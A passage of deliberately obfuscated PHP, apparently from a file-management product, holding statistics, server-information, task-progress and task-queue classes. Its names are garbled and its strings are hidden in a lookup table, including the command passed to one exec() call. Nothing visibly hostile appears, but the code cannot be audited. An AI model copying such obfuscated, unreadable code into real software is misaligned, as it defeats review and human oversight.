$b£˜ªÀŠËÀ = array($EÔÔÄòˆ–[193] => array($EÔÔÄòˆ–[954], $FØøŸóçõò)); $bÁÆ£í…¨´ = Model($EÔÔÄòˆ–[505])->where($b£˜ªÀŠËÀ)->count($EÔÔÄòˆ–[1508]); $b£˜ªÀŠËÀ[$EÔÔÄòˆ–[193]] = array($EÔÔÄòˆ–[330], array($aÑÉÍƒĞ¹, $FØøŸóçõò)); goto bºŠÙœ±²ñ; bºŠÙœ±²ñ: $FœÓôí±†È = Model($EÔÔÄòˆ–[505])->where($b£˜ªÀŠËÀ)->count($EÔÔÄòˆ–[1508]); $b£˜ªÀŠËÀ[$EÔÔÄòˆ–[29]] = $EÔÔÄòˆ–[1611]; $f—İâ­ğƒ = Model($EÔÔÄòˆ–[1612])->where($b£˜ªÀŠËÀ)->count($EÔÔÄòˆ–[1613]); goto Cò°Ó‚ŒŠ¼; Cò°Ó‚ŒŠ¼: $C²Œ—ÇØ² = array($EÔÔÄòˆ–[221] => $fœ…–îè²„, $EÔÔÄòˆ–[709] => (int) $bÁÆ£í…¨´, $EÔÔÄòˆ–[1598] => (int) $FœÓôí±†È, $EÔÔÄòˆ–[1599] => (int) $f—İâ­ğƒ); return $this->insert($C²Œ—ÇØ²); goto cÂ‡°ˆ‘Ö—; E‚˜Ú×‚Á£: $EÔÔÄòˆ– =& $_SERVER[Ïº«‚ßèÔˆø]; $aÑÉÍƒĞ¹ = strtotime(date($EÔÔÄòˆ–[1609], strtotime($fœ…–îè²„))); $FØøŸóçõò = strtotime(date($EÔÔÄòˆ–[1610], strtotime($fœ…–îè²„))); goto F‹”º ê; cÂ‡°ˆ‘Ö—: } public function _recordStore($cí™¬…»Ù† = '') { goto dÕ¥í¤ö…„; dÕ¥í¤ö…„: $bîªì™„¶î =& $_SERVER[Ïº«‚ßèÔˆø]; $EŒö¯…ÕÖ = strtotime(date($bîªì™„¶î[1610], strtotime($cí™¬…»Ù†))); $dóˆ±éƒ‹ˆ = array($bîªì™„¶î[193] => array($bîªì™„¶î[954], $EŒö¯…ÕÖ)); goto Fä…×ªˆ»œ; d‰ÕÒ¿šš«: $d×ÂÂ•ºíÉ = Model($bîªì™„¶î[782])->where($dóˆ±éƒ‹ˆ)->sum($bîªì™„¶î[78]); $bóïˆ¯àÖ = array($bîªì™„¶î[221] => $cí™¬…»Ù†, $bîªì™„¶î[707] => (int) $DíŸø„ÍÑ‰, $bîªì™„¶î[1602] => (int) $d±øñéÎõ†, $bîªì™„¶î[1603] => (int) $c¾…„¡õê, $bîªì™„¶î[1604] => (int) $d×ÂÂ•ºíÉ); return $this->insert($bóïˆ¯àÖ); goto E‰ó¢ ÆÅğ; e¯Ğ×°óİİ: $dóˆ±éƒ‹ˆ[$bîªì™„¶î[402]] = 1; $c¾…„¡õê = Model($bîªì™„¶î[782])->where($dóˆ±éƒ‹ˆ)->sum($bîªì™„¶î[78]); $dóˆ±éƒ‹ˆ[$bîªì™„¶î[402]] = 2; goto d‰ÕÒ¿šš«; Fä…×ªˆ»œ: $d±øñéÎõ† = Model($bîªì™„¶î[448])->where($dóˆ±éƒ‹ˆ)->sum($bîªì™„¶î[78]); $dóˆ±éƒ‹ˆ[$bîªì™„¶î[401]] = 0; $DíŸø„ÍÑ‰ = Model($bîªì™„¶î[782])->where($dóˆ±éƒ‹ˆ)->sum($bîªì™„¶î[78]); goto e¯Ğ×°óİİ; E‰ó¢ ÆÅğ: } public function trend($EÄóŞÀìïš, $A“ÑĞèŠºÂ) { goto bÒÂ‰ö¶Ó; EÒ¡äôƒ¤: return $d÷«‰à©’æ; goto dÑ˜å‚’öñ; A—ŒµìŒØ·: if ($fƒ†½î”ùµ && $A“ÑĞèŠºÂ != $cµğøÓßÀÔ[1482]) { $dßÊøÒ²å = $fƒ†½î”ùµ[0][$cµğøÓßÀÔ[221]]; $C²ÑÇ”«› = $this->validDate($A“ÑĞèŠºÂ, $dßÊøÒ²å); $aİ ´²ßµ‰ = array(); $B‡³·›¼Ø— = array_to_keyvalue($fƒ†½î”ùµ, $cµğøÓßÀÔ[221]); foreach ($C²ÑÇ”«› as $Bº¸œ¾ÊÜÇ) { if (isset($B‡³·›¼Ø—[$Bº¸œ¾ÊÜÇ])) { $AÚÓé¶à…Ü = $B‡³·›¼Ø—[$Bº¸œ¾ÊÜÇ]; } else { $AÚÓé¶à…Ü = end($fƒ†½î”ùµ); $AÚÓé¶à…Ü[$cµğøÓßÀÔ[221]] = $Bº¸œ¾ÊÜÇ; if ($EÄóŞÀìïš == $cµğøÓßÀÔ[561]) { $AÚÓé¶à…Ü[$cµğøÓßÀÔ[1598]] = $AÚÓé¶à…Ü[$cµğøÓßÀÔ[1599]] = 0; } } $aİ ´²ßµ‰[] = $AÚÓé¶à…Ü; } $fƒ†½î”ùµ = $aİ ´²ßµ‰; } $AœŞÎ›»ì§ = array($cµğøÓßÀÔ[561] => array($cµğøÓßÀÔ[709] => LNG($cµğøÓßÀÔ[1614]), $cµğøÓßÀÔ[1598] => LNG($cµğøÓßÀÔ[1615]), $cµğøÓßÀÔ[1599] => LNG($cµğøÓßÀÔ[1616])), $cµğøÓßÀÔ[1600] => array($cµğøÓßÀÔ[707] => LNG($cµğøÓßÀÔ[1617]), $cµğøÓßÀÔ[1602] => LNG($cµğøÓßÀÔ[1618]), $cµğøÓßÀÔ[1603] => LNG($cµğøÓßÀÔ[1619]), $cµğøÓßÀÔ[1604] => LNG($cµğøÓßÀÔ[1620]))); $fó‘†¨²»ë = array($cµğøÓßÀÔ[561] => $cµğøÓßÀÔ[1621], $cµğøÓßÀÔ[1600] => $cµğøÓßÀÔ[78]); goto f‡ó«ï¢ ä; bÒÂ‰ö¶Ó: $cµğøÓßÀÔ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->init($EÄóŞÀìïš)) { return !1; } $fƒ†½î”ùµ = $this->trendList($EÄóŞÀìïš); goto A—ŒµìŒØ·; f‡ó«ï¢ ä: if (empty($fƒ†½î”ùµ)) { $Bº¸œ¾ÊÜÇ = date($cµğøÓßÀÔ[1605], strtotime($cµğøÓßÀÔ[1606])); $BÄİôöÏîÄ = array($cµğøÓßÀÔ[221] => $Bº¸œ¾ÊÜÇ); foreach ($AœŞÎ›»ì§[$EÄóŞÀìïš] as $bµ…Ö‘ÒÙÇ => $FÍâ…¦•Ë‘) { $BÄİôöÏîÄ[$bµ…Ö‘ÒÙÇ] = 0; } $fƒ†½î”ùµ[] = $BÄİôöÏîÄ; } $d÷«‰à©’æ = array(); foreach ($fƒ†½î”ùµ as $FÍâ…¦•Ë‘) { if ($EÄóŞÀìïš == $cµğøÓßÀÔ[1600] && $FÍâ…¦•Ë‘[$cµğøÓßÀÔ[1602]] > $FÍâ…¦•Ë‘[$cµğøÓßÀÔ[707]]) { $FÍâ…¦•Ë‘[$cµğøÓßÀÔ[1602]] = $FÍâ…¦•Ë‘[$cµğøÓßÀÔ[707]]; } foreach ($AœŞÎ›»ì§[$EÄóŞÀìïš] as $bµ…Ö‘ÒÙÇ => $døæƒ…‹—ã) { $AÚÓé¶à…Ü = array($cµğøÓßÀÔ[221] => $FÍâ…¦•Ë‘[$cµğøÓßÀÔ[221]], $cµğøÓßÀÔ[1414] => $døæƒ…‹—ã); $AÚÓé¶à…Ü[$fó‘†¨²»ë[$EÄóŞÀìïš]] = isset($FÍâ…¦•Ë‘[$bµ…Ö‘ÒÙÇ]) ? $FÍâ…¦•Ë‘[$bµ…Ö‘ÒÙÇ] : 0; $d÷«‰à©’æ[] = $AÚÓé¶à…Ü; } } goto EÒ¡äôƒ¤; dÑ˜å‚’öñ: } public function validDate($E„Ã½‰šµ, $B¨ƒ³çõÃ) { goto Bƒ’»‘¸Ø„; f„ˆ¨ƒŠ¶¯: switch ($E„Ã½‰šµ) { case $c‘×­§«›Ô[1489]: $bóæõŒ²îƒ = mktime(0, 0, 0, date($c‘×­§«›Ô[1622]), date($c‘×­§«›Ô[1234]) - date($c‘×­§«›Ô[1296]) + 7 - 7, date($c‘×­§«›Ô[1623])); $dÀÅã‚‚µ… = 0; do { $bİË·ğ¦ìÛ = date($c‘×­§«›Ô[1605], $bóæõŒ²îƒ - 3600 * 24 * 7 * $dÀÅã‚‚µ…); $dÏ®âºãÁ§[] = $bİË·ğ¦ìÛ; $dÀÅã‚‚µ…++; } while ($B¨ƒ³çõÃ < $bİË·ğ¦ìÛ); break; case $c‘×­§«›Ô[1487]: $dÀÅã‚‚µ… = 1; do { $däù«­í¼ = date($c‘×­§«›Ô[1624], strtotime("\55\40{$dÀÅã‚‚µ…}\x20\x6d\x6f\x6e\x74\x68\x73")); $dÏ®âºãÁ§[] = $däù«­í¼; $dÀÅã‚‚µ…++; } while ($B¨ƒ³çõÃ < $däù«­í¼); break; case $c‘×­§«›Ô[1625]: $a¼ÂÚ‡¼¦ = (int) date($c‘×­§«›Ô[1623], strtotime($B¨ƒ³çõÃ)); $Fù”¼‘ö±Î = (int) date($c‘×­§«›Ô[1623]); if ($a¼ÂÚ‡¼¦ >= $Fù”¼‘ö±Î) { break; } for ($a¼ÂÚ‡¼¦; $a¼ÂÚ‡¼¦ < $Fù”¼‘ö±Î; $a¼ÂÚ‡¼¦++) { $dÏ®âºãÁ§[] = $a¼ÂÚ‡¼¦ . $c‘×­§«›Ô[1626]; } break; default: break; } if ($B¨ƒ³çõÃ > end($dÏ®âºãÁ§)) { array_pop($dÏ®âºãÁ§); } sort($dÏ®âºãÁ§); goto dĞ½¦Ç†äµ; dĞ½¦Ç†äµ: return $dÏ®âºãÁ§; goto a«¹Ø˜Ïê»; Bƒ’»‘¸Ø„: $c‘×­§«›Ô =& $_SERVER[Ïº«‚ßèÔˆø]; $a×–±¾åÅŞ = date($c‘×­§«›Ô[1605], strtotime($c‘×­§«›Ô[1606])); $dÏ®âºãÁ§ = array($a×–±¾åÅŞ); goto f„ˆ¨ƒŠ¶¯; a«¹Ø˜Ïê»: } public function listTable($c–Ä§æ™‰¿) { $B »¾œ÷‚¹ = ucfirst($c–Ä§æ™‰¿); return Model($B »¾œ÷‚¹)->listData(); } public function option($f„íİÑ—›¶) { $dÇ¾ëŒà = $_SERVER[Ïº«‚ßèÔˆø][1627] . ucfirst($f„íİÑ—›¶); return $this->{$dÇ¾ëŒà}(); } private function optionUser() { goto f‚—ŞíŸ°­; Bò½‹îŠ‡: return array($eƒÜĞÀš»œ[703] => (int) $a’¤Œ¢â¸Œ, $eƒÜĞÀš»œ[1630] => (int) ($a’¤Œ¢â¸Œ - $D…Ä‹Ã†Ê¤), $eƒÜĞÀš»œ[1631] => (int) $D…Ä‹Ã†Ê¤, $eƒÜĞÀš»œ[1632] => (int) $C”­²Ò“™á, $eƒÜĞÀš»œ[1633] => $b ÛÓ©ËÉ†); goto eÙã„÷‰¿Ö; f‚—ŞíŸ°­: $eƒÜĞÀš»œ =& $_SERVER[Ïº«‚ßèÔˆø]; $a’¤Œ¢â¸Œ = Model($eƒÜĞÀš»œ[505])->count($eƒÜĞÀš»œ[1508]); $D…Ä‹Ã†Ê¤ = Model($eƒÜĞÀš»œ[505])->where($eƒÜĞÀš»œ[1628])->count($eƒÜĞÀš»œ[1508]); goto Dš©¡ã¦Â; b…»êÚéŠæ: if ($b Å™§Ôª < $Bàò¸î©È) { $b Å™§Ôª = $Bàò¸î©È; } $b‘Ê¿åœ¹ = array($eƒÜĞÀš»œ[1629] => array($eƒÜĞÀš»œ[955], $b Å™§Ôª)); $b ÛÓ©ËÉ† = (int) Model($eƒÜĞÀš»œ[505])->where($b‘Ê¿åœ¹)->count($eƒÜĞÀš»œ[1508]); goto dÓ¤ì†ƒœâ; dÓ¤ì†ƒœâ: if (!$b ÛÓ©ËÉ†) { $b ÛÓ©ËÉ† = 1; } $b‘Ê¿åœ¹ = array($eƒÜĞÀš»œ[1629] => array($eƒÜĞÀš»œ[955], $Bàò¸î©È)); $C”­²Ò“™á = Model($eƒÜĞÀš»œ[505])->where($b‘Ê¿åœ¹)->count($eƒÜĞÀš»œ[1508]); goto Bò½‹îŠ‡; Dš©¡ã¦Â: $Fî‰«¼“Äí = intval($GLOBALS[$eƒÜĞÀš»œ[6]][$eƒÜĞÀš»œ[346]][$eƒÜĞÀš»œ[1468]]) / 3600; $b Å™§Ôª = strtotime("\55{$Fî‰«¼“Äí}\40\150\157\165\162\163"); $Bàò¸î©È = strtotime(date($eƒÜĞÀš»œ[1609])); goto b…»êÚéŠæ; eÙã„÷‰¿Ö: } private function optionFile() { goto e£Ì²Ÿ‰ö®; b­¢ø‹ìî: $b‰ÔÍœ«Û  = $aĞ§›¥Íˆ›[$e—âóÀ‹Ò¤[1602]]; $c–¾×øóÜæ = Model($e—âóÀ‹Ò¤[782])->where(array($e—âóÀ‹Ò¤[401] => 0))->count($e—âóÀ‹Ò¤[394]); $aó’ï›‡å = array($e—âóÀ‹Ò¤[401] => 0, $e—âóÀ‹Ò¤[193] => array($e—âóÀ‹Ò¤[955], strtotime(date($e—âóÀ‹Ò¤[1609])))); goto a‰á—¤éÉ; a‰á—¤éÉ: $fĞ£ìã¦Î® = Model($e—âóÀ‹Ò¤[782])->where($aó’ï›‡å)->sum($e—âóÀ‹Ò¤[78]); $Eˆ”·“—åç = Model($e—âóÀ‹Ò¤[782])->where($aó’ï›‡å)->count($e—âóÀ‹Ò¤[394]); return array($e—âóÀ‹Ò¤[707] => $DùÉÄ¯‡Úê, $e—âóÀ‹Ò¤[1602] => $b‰ÔÍœ«Û , $e—âóÀ‹Ò¤[1634] => $DùÉÄ¯‡Úê - $b‰ÔÍœ«Û , $e—âóÀ‹Ò¤[1635] => (int) $fĞ£ìã¦Î®, $e—âóÀ‹Ò¤[709] => (int) $c–¾×øóÜæ, $e—âóÀ‹Ò¤[1636] => (int) $Eˆ”·“—åç); goto e÷‰Æ„©»©; e£Ì²Ÿ‰ö®: $e—âóÀ‹Ò¤ =& $_SERVER[Ïº«‚ßèÔˆø]; $aĞ§›¥Íˆ› = $this->sourceSize(); $DùÉÄ¯‡Úê = $aĞ§›¥Íˆ›[$e—âóÀ‹Ò¤[78]]; goto b­¢ø‹ìî; e÷‰Æ„©»©: } private function optionAccess() { $D×ƒëŒ‘øê =& $_SERVER[Ïº«‚ßèÔˆø]; return array($D×ƒëŒ‘øê[703] => $this->typeLogCnt(), $D×ƒëŒ‘øê[107] => $this->typeLogCnt($D×ƒëŒ‘øê[107]), $D×ƒëŒ‘øê[428] => $this->typeLogCnt($D×ƒëŒ‘øê[428]), $D×ƒëŒ‘øê[1637] => $this->typeLogCnt($D×ƒëŒ‘øê[1637]), $D×ƒëŒ‘øê[1638] => $this->typeLogCnt($D×ƒëŒ‘øê[1638]), $D×ƒëŒ‘øê[561] => $this->typeLogCnt($D×ƒëŒ‘øê[33], $D×ƒëŒ‘øê[1613])); } private function typeLogCnt($B“œ«Ñ£é = '', $EÇĞğ©Œ££ = "\x69\144") { goto a‡¸â‚±¤; a‡¸â‚±¤: $D¹¨ƒˆÑÂŒ =& $_SERVER[Ïº«‚ßèÔˆø]; $cÜ«¿—­ñŒ = array($D¹¨ƒˆÑÂŒ[107] => array($D¹¨ƒˆÑÂŒ[1639], $D¹¨ƒˆÑÂŒ[1640]), $D¹¨ƒˆÑÂŒ[428] => array($D¹¨ƒˆÑÂŒ[1641], $D¹¨ƒˆÑÂŒ[1642]), $D¹¨ƒˆÑÂŒ[1637] => array($D¹¨ƒˆÑÂŒ[1643], $D¹¨ƒˆÑÂŒ[1644], $D¹¨ƒˆÑÂŒ[1645]), $D¹¨ƒˆÑÂŒ[1638] => array($D¹¨ƒˆÑÂŒ[1646], $D¹¨ƒˆÑÂŒ[1647]), $D¹¨ƒˆÑÂŒ[1648] => array($D¹¨ƒˆÑÂŒ[1649], $D¹¨ƒˆÑÂŒ[1650], $D¹¨ƒˆÑÂŒ[1651])); $Eš×Šï‘šğ = strtotime(date($D¹¨ƒˆÑÂŒ[1609])); goto cÎ»İÄ¾‰; cÎ»İÄ¾‰: $aÜƒÛ­·—Ú = array($D¹¨ƒˆÑÂŒ[193] => array($D¹¨ƒˆÑÂŒ[955], $Eš×Šï‘šğ)); if ($B“œ«Ñ£é) { $aÜƒÛ­·—Ú[$D¹¨ƒˆÑÂŒ[29]] = array($D¹¨ƒˆÑÂŒ[7], $cÜ«¿—­ñŒ[$B“œ«Ñ£é]); } $e‘¢êŸÛ³Û = Model($D¹¨ƒˆÑÂŒ[1612])->where($aÜƒÛ­·—Ú)->count($EÇĞğ©Œ££); goto b†ÓŒîİÀ˜; b†ÓŒîİÀ˜: return (int) $e‘¢êŸÛ³Û; goto F©Ï®à­´¼; F©Ï®à­´¼: } private function optionServer() { goto bôÔÏâ¶´‰; f›®¢ÚÖÆå: $C©²³Êâ±¨ = $c­¨™´ÙŒ[0]; $BØÎ¼­½ÓÁ = $GLOBALS[$D·¼åŒí[6]][$D·¼åŒí[17]]; $c•˜‹¿óé = $BØÎ¼­½ÓÁ[$D·¼åŒí[916]]; goto BÔŸ®Ğ±Ù›; bôÔÏâ¶´‰: $D·¼åŒí =& $_SERVER[Ïº«‚ßèÔˆø]; $F•‚‰ØÆó± = $this->diskDriver(); $a’íÛ’¬ŸÖ = KodIO::defaultDriver(); goto aØä£Û‚¯œ; BÔŸ®Ğ±Ù›: if ($c•˜‹¿óé == $D·¼åŒí[739]) { $d®›ù†¥–— = explode($D·¼åŒí[1148], $BØÎ¼­½ÓÁ[$D·¼åŒí[915]]); $c•˜‹¿óé = $d®›ù†¥–—[0]; } if ($c•˜‹¿óé == $D·¼åŒí[742] || $c•˜‹¿óé == $D·¼åŒí[743]) { $bêòÜ“¡†á = Model()->db()->query($D·¼åŒí[1652]); $D·Ï½…¬óê = $bêòÜ“¡†á[0] && isset($bêòÜ“¡†á[0][$D·¼åŒí[1413]]) ? $bêòÜ“¡†á[0][$D·¼åŒí[1413]] : 0; $c•˜‹¿óé = $D·¼åŒí[1653] . ($D·Ï½…¬óê ? $D·¼åŒí[8] . $D·Ï½…¬óê : $D·¼åŒí[33]); } $bÏÅà­øÇ± = $GLOBALS[$D·¼åŒí[6]][$D·¼åŒí[346]][$D·¼åŒí[784]]; goto Fé®õ é²£; Fé®õ é²£: return array($D·¼åŒí[1654] => $F•‚‰ØÆó± ? $F•‚‰ØÆó±[$D·¼åŒí[1655]] : 0, $D·¼åŒí[1656] => $F•‚‰ØÆó± ? $F•‚‰ØÆó±[$D·¼åŒí[1657]] : 0, $D·¼åŒí[1658] => (int) $a’íÛ’¬ŸÖ[$D·¼åŒí[1655]] * 1024 * 1024 * 1024, $D·¼åŒí[1659] => (int) $cãÙš¹à , $D·¼åŒí[1660] => ucfirst($C©²³Êâ±¨), $D·¼åŒí[1661] => $D·¼åŒí[1662] . PHP_VERSION, $D·¼åŒí[1663] => phpBuild64() ? 64 : 32, $D·¼åŒí[702] => str_replace($D·¼åŒí[1664], $D·¼åŒí[932], $c•˜‹¿óé), $D·¼åŒí[346] => ucfirst($bÏÅà­øÇ±), $D·¼åŒí[28] => $_SERVER[$D·¼åŒí[1665]]); goto f‘ß×Ô—‘Å; aØä£Û‚¯œ: $F©¿ğ÷ñáİ = array($D·¼åŒí[774] => $a’íÛ’¬ŸÖ[$D·¼åŒí[392]]); $cãÙš¹à  = Model($D·¼åŒí[448])->where($F©¿ğ÷ñáİ)->sum($D·¼åŒí[78]); $c­¨™´ÙŒ = explode($D·¼åŒí[50], $_SERVER[$D·¼åŒí[142]]); goto f›®¢ÚÖÆå; f‘ß×Ô—‘Å: } private function diskDriver() { goto dç´Ô¼Êîß; EŒšÚ‚ø³Ü: if ($cŸòã‚ˆ) { $D“¨Ñ‰Œ°ä = $B’Šê¥‡‡[1668]; if (function_exists($B’Šê¥‡‡[1669])) { exec($B’Šê¥‡‡[1670], $fğÑ˜°¹º); $D“¨Ñ‰Œ°ä = $fğÑ˜°¹º[1] . $B’Šê¥‡‡[8]; } } if (!file_exists($D“¨Ñ‰Œ°ä)) { return; } $Fó«ƒ ÔÅô = @disk_total_space($D“¨Ñ‰Œ°ä); goto D–²±Ó’•†; dç´Ô¼Êîß: $B’Šê¥‡‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $D“¨Ñ‰Œ°ä = $B’Šê¥‡‡[8]; $cŸòã‚ˆ = $GLOBALS[$B’Šê¥‡‡[6]][$B’Šê¥‡‡[1666]] == $B’Šê¥‡‡[1667]; goto EŒšÚ‚ø³Ü; D–²±Ó’•†: $cÈ÷†Éëàé = $Fó«ƒ ÔÅô - @disk_free_space($D“¨Ñ‰Œ°ä); return array($B’Šê¥‡‡[1655] => $Fó«ƒ ÔÅô, $B’Šê¥‡‡[1657] => $cÈ÷†Éëàé); goto f„—²ĞÛÓ„; f„—²ĞÛÓ„: } public function fileChart($E‘»¥¶Àìö) { goto cÄ†•›¢Ü¸; cÄ†•›¢Ü¸: $e©»¨®ï´Ì =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($E‘»¥¶Àìö[$e©»¨®ï´Ì[1508]])) { return Model($e©»¨®ï´Ì[782])->userFileTypeProfile($E‘»¥¶Àìö[$e©»¨®ï´Ì[1508]]); } if (isset($E‘»¥¶Àìö[$e©»¨®ï´Ì[1671]])) { return Model($e©»¨®ï´Ì[782])->groupFileTypeProfile($E‘»¥¶Àìö[$e©»¨®ï´Ì[1671]]); } goto AÀèîó®ƒ; AÀèîó®ƒ: $fñò¯“™×§ = $this->sourceSize(); $B›ñ–á‹ƒ÷ = array($e©»¨®ï´Ì[476] => 0, $e©»¨®ï´Ì[402] => 1); $dĞéæµà·– = Model($e©»¨®ï´Ì[782])->where($B›ñ–á‹ƒ÷)->sum($e©»¨®ï´Ì[78]); goto dƒäÑĞÁã; dƒäÑĞÁã: $B›ñ–á‹ƒ÷[$e©»¨®ï´Ì[402]] = 2; $döÏ‡ù‰Ìá = Model($e©»¨®ï´Ì[782])->where($B›ñ–á‹ƒ÷)->sum($e©»¨®ï´Ì[78]); return array($e©»¨®ï´Ì[707] => $fñò¯“™×§[$e©»¨®ï´Ì[78]], $e©»¨®ï´Ì[1602] => $fñò¯“™×§[$e©»¨®ï´Ì[1602]], $e©»¨®ï´Ì[1603] => (int) $dĞéæµà·–, $e©»¨®ï´Ì[1604] => (int) $döÏ‡ù‰Ìá); goto CæÌöçáªÚ; CæÌöçáªÚ: } private function sourceSize() { $bŸ¤¢ŒíÆ‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $dÁ‹Õá¥ïì = Model($bŸ¤¢ŒíÆ‹[782])->where(array($bŸ¤¢ŒíÆ‹[401] => 0))->sum($bŸ¤¢ŒíÆ‹[78]); $A¾·›í—ô = Model($bŸ¤¢ŒíÆ‹[448])->sum($bŸ¤¢ŒíÆ‹[78]); if ($A¾·›í—ô > $dÁ‹Õá¥ïì) { $A¾·›í—ô = $dÁ‹Õá¥ïì; } return array($bŸ¤¢ŒíÆ‹[78] => (int) $dÁ‹Õá¥ïì, $bŸ¤¢ŒíÆ‹[1602] => (int) $A¾·›í—ô); } } goto A¼ ĞíìÁ; a‚­Ä–¤Õó: class TaskHttp extends Task { protected function startAfter() { $FÂÍö‘Šµ =& $_SERVER[Ïº«‚ßèÔˆø]; $B’âÓõÑ®ó =& $this->task; $B’âÓõÑ®ó[$FÂÍö‘Šµ[1571]] = 1; Hook::bind($FÂÍö‘Šµ[1543], array($this, $FÂÍö‘Šµ[1572])); Hook::bind($FÂÍö‘Šµ[1545], array($this, $FÂÍö‘Šµ[1573])); Hook::bind($FÂÍö‘Šµ[1547], array($this, $FÂÍö‘Šµ[1574])); } protected function endAfter() { $aËÒ‹å¯¯µ =& $_SERVER[Ïº«‚ßèÔˆø]; Hook::unbind($aËÒ‹å¯¯µ[1543], array($this, $aËÒ‹å¯¯µ[1572])); Hook::unbind($aËÒ‹å¯¯µ[1545], array($this, $aËÒ‹å¯¯µ[1573])); Hook::unbind($aËÒ‹å¯¯µ[1547], array($this, $aËÒ‹å¯¯µ[1574])); } public function progressStart($e­Í°†îˆ) { $eœ‰ë¨ŠÛ =& $_SERVER[Ïº«‚ßèÔˆø]; $Föø‹ÒÚïâ = curl_getinfo($e­Í°†îˆ); self::log($eœ‰ë¨ŠÛ[1575] . $Föø‹ÒÚïâ[$eœ‰ë¨ŠÛ[304]]); self::valueSet($this->task[$eœ‰ë¨ŠÛ[392]], $this->task); } public function progressEnd($Bİ¶‘÷½ÎÛ) { $Aõƒê»†ÍÃ =& $_SERVER[Ïº«‚ßèÔˆø]; self::log($Aõƒê»†ÍÃ[1576] . $this->task[$Aõƒê»†ÍÃ[392]]); $this->end(); } public function progress($CÕ Á“Šò, $F‰à¼ŠÈÎÖ, $fê²–º¼», $C¾Ü¨Úçô, $dã‹Â¼ó¡Ø) { $D­íÏ¾ŸÈ =& $_SERVER[Ïº«‚ßèÔˆø]; $AŠîÆÈ‹ƒ =& $this->task; if ($dã‹Â¼ó¡Ø > 0) { $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1005]] = $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1005]] == 0 ? $C¾Ü¨Úçô : $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1005]]; $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1019]] = $dã‹Â¼ó¡Ø; } else { if ($fê²–º¼» > 0) { $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1005]] = $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1005]] == 0 ? $F‰à¼ŠÈÎÖ : $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1005]]; $AŠîÆÈ‹ƒ[$D­íÏ¾ŸÈ[1019]] = $fê²–º¼»; } } $this->update(); self::log("\160\x72\x6f\x67\x72\145\163\x73\x48\164\164\160\x3a\x64\x6f\x77\x6e\x3a{$fê²–º¼»}\57{$F‰à¼ŠÈÎÖ}\x3b\40\x75\x70\154\157\141\x64\x3a{$dã‹Â¼ó¡Ø}\57{$C¾Ü¨Úçô}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\x65\165\x65\114\145\x6e\147\x74\150"; const QUEUE_DATA = "\164\141\x73\x6b\121\165\145\x75\145\104\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($bÉˆ©Ñ“, $AèÈ¨¸äó = array(), $CìßÈ§øß… = '', $D®×ßƒ’ã± = '') { $e¼©ìˆØÁ¯ =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($D®×ßƒ’ã± && array_find_by_field(self::$listData, $e¼©ìˆØÁ¯[93], $D®×ßƒ’ã±)) { return !0; } self::$listData[] = array($e¼©ìˆØÁ¯[261] => $bÉˆ©Ñ“, $e¼©ìˆØÁ¯[1577] => $AèÈ¨¸äó, $e¼©ìˆØÁ¯[429] => $CìßÈ§øß…, $e¼©ìˆØÁ¯[93] => $D®×ßƒ’ã±); return !0; } public static function addSubmit() { $dåíÜôÃ˜ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($dåíÜôÃ˜[1578] . json_encode_force(array_to_keyvalue(self::$listData, $dåíÜôÃ˜[33], $dåíÜôÃ˜[429])), $dåíÜôÃ˜[1579]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($d–ê®ÂÇÊ•, $a•“‰«ê³ = array(), $bĞÅ—´³¨ = '', $Bˆ¯¯²™÷¹ = '') { goto b†ç˜ñŠ“å; Fø§éÅœ½’: self::setAll($dí¤¤›ƒÕ); return !0; goto BÆİğê™¹ù; a‚š­²åùÕ: if ($Bˆ¯¯²™÷¹ && array_find_by_field($dí¤¤›ƒÕ, $AŠÛ¬ŠØ[93], $Bˆ¯¯²™÷¹)) { return !0; } $dí¤¤›ƒÕ[] = array($AŠÛ¬ŠØ[261] => $d–ê®ÂÇÊ•, $AŠÛ¬ŠØ[1577] => $a•“‰«ê³, $AŠÛ¬ŠØ[429] => $bĞÅ—´³¨, $AŠÛ¬ŠØ[93] => $Bˆ¯¯²™÷¹); write_log($AŠÛ¬ŠØ[1578] . $bĞÅ—´³¨, $AŠÛ¬ŠØ[1579]); goto Fø§éÅœ½’; b†ç˜ñŠ“å: $AŠÛ¬ŠØ =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::count() >= self::MAX_LENGTH) { return !1; } $dí¤¤›ƒÕ = self::getAll(); goto a‚š­²åùÕ; BÆİğê™¹ù: } public static function run() { goto c˜¨‹ª§Ş; d•Ú‚ãÍ®Š: if (!$AŞĞ£…Œ„) { return !1; } self::setAll($b°²©ôÚÕ ); $d×Îµ™¢Ç = timeFloat(); goto D°Ş¤‹ÉÖÇ; c˜¨‹ª§Ş: $f«ã¥…áª¦ =& $_SERVER[Ïº«‚ßèÔˆø]; $b°²©ôÚÕ  = self::getAll(); $AŞĞ£…Œ„ = array_shift($b°²©ôÚÕ ); goto d•Ú‚ãÍ®Š; D°Ş¤‹ÉÖÇ: try { Hook::apply($AŞĞ£…Œ„[$f«ã¥…áª¦[261]], $AŞĞ£…Œ„[$f«ã¥…áª¦[1577]]); } catch (Exception $EìØàÒ•ùØ) { } $C†–ÅÄî†ñ = number_format(timeFloat() - $d×Îµ™¢Ç, 3) . $f«ã¥…áª¦[1521]; write_log($f«ã¥…áª¦[1580] . $AŞĞ£…Œ„[$f«ã¥…áª¦[429]] . $f«ã¥…áª¦[1581] . $C†–ÅÄî†ñ, $f«ã¥…áª¦[1579]); goto D÷‹£±˜†ù; D÷‹£±˜†ù: return !0; goto FÛÁ™×ç‹­; FÛÁ™×ç‹­: } public static function count() { 